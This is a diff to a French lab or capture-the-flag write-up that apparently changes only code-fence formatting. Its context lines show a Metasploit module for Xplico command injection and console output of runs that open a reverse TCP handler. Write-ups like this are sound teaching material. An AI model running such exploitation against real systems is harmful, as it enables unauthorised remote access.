@@ -45,7 +45,7 @@ Bien sûr ici on est principalement intéressés par les vulnérabilités du log
 
 Metasploit dispose d'un module d'attaque dont voici la description et les payloads possibles :  
 
-```plain
+```
 Description:
   This module exploits command injection vulnerability. 
   Unauthenticated users can register a new account and then execute a 
@@ -67,7 +67,7 @@ Compatible Payloads
 
 L'exploitation n'a pas été à la hauteur de nos espérances :  
 
-```plain
+```
 msf5 exploit(linux/http/xplico_exec) > run
 
 [*] Started reverse TCP handler on 10.254.0.29:4444 
@@ -90,7 +90,7 @@ L'exploit utilise donc le temps qu'il croit être juste... en gros il faut que t
 
 Du coup c'est principalement le manque de chance... bref on relance jusqu'à ce que...  
 
-```plain
+```
 [*] Started reverse TCP handler on 10.254.0.29:4444 
 [*] Initiating new session on server side
 [*] Registering a new user
@@ -114,7 +114,7 @@ Du coup c'est principalement le manque de chance... bref on relance jusqu'à ce 
 
 C'est mieux mais ça n'aboutit toujours pas. Il s'est avéré que l'upload des fichiers ne fonctionnait plus sur la machine pour une raison inconnue. Un reset de la machine plus tard :  
 
-```plain
+```
 msf5 exploit(linux/http/xplico_exec) > run
 
 [*] Started reverse TCP handler on 10.254.0.29:4444
